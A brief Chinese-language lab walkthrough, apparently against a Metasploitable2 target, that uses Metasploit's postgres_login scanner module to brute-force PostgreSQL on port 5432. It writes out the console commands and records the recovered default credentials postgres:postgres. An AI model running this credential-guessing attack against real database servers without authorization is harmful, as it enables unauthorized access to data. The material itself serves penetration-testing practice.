# 5432_postgresql

使用msf进行爆破

> search postgres_login

![image-20210319154138755](../../image/meteaspolitale2/image-20210319154138755.png)

选择模块脚本

> use auxiliary/scanner/postgres/postgres_login

设置目标靶机

> set RHOSTS 10.10.10.6

设置线程

> set THREADS 16

![image-20210319154216873](../../image/meteaspolitale2/image-20210319154216873.png)

执行

> exploit

![image-20210319154239154](../../image/meteaspolitale2/image-20210319154239154.png)

得到用户名密码

> postgres:postgres

是默认密码

客户端登录

![image-20210319154401759](../../image/meteaspolitale2/image-20210319154401759.png)

使用图形化登录

![image-20210319154807173](../../image/meteaspolitale2/image-20210319154807173.png)